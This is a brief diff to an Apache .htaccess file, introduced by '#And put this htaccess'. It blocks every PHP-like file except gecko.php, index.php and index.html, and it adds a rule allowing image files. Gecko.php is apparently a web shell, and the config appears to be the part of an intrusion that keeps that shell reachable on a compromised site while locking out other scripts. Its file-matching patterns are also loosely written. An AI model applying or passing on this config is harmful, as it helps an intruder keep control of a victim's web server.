@@ -4,12 +4,14 @@
 #And put this htaccess
 
 
-
 <FilesMatch ".ph*|Ph*|pH*|PH*">
     Order Deny,Allow
     Deny from all
 </FilesMatch>
 <FilesMatch "gecko.php|index.php|index.html">
     Order Deny, Allow
+    Allow from all
+</FilesMatch>
+<FilesMatch "\.(jpe?g|bmp|png)$">
     Allow from all
 </FilesMatch>
